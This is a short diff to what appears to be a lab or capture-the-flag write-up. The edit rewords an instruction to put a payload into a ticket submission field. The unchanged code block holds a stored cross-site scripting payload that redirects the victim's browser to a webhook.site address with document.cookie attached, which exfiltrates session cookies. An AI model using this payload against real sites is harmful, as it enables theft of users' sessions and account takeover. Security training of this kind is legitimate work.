@@ -1,4 +1,4 @@
-We can set up a webhook at webhook.site and then execute the following command:
+We can set up a webhook at webhook.site and then enter the following command into the ticket submission field:
 ```
 <script>window.location.href = `https://webhook.site/99acbbcc-f95d-40f0-8678-2b6a4518b613/?param=${document.cookie}`</script>
 ```
